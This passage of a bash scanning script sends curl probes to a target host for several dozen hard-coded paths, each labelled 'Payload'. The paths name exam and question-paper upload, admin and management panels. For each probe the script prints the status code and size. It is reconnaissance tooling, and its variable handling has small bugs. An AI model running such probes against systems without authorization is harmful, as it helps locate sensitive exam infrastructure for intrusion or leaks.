echo -n "Payload ["DataPipelineQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlAccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlAccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
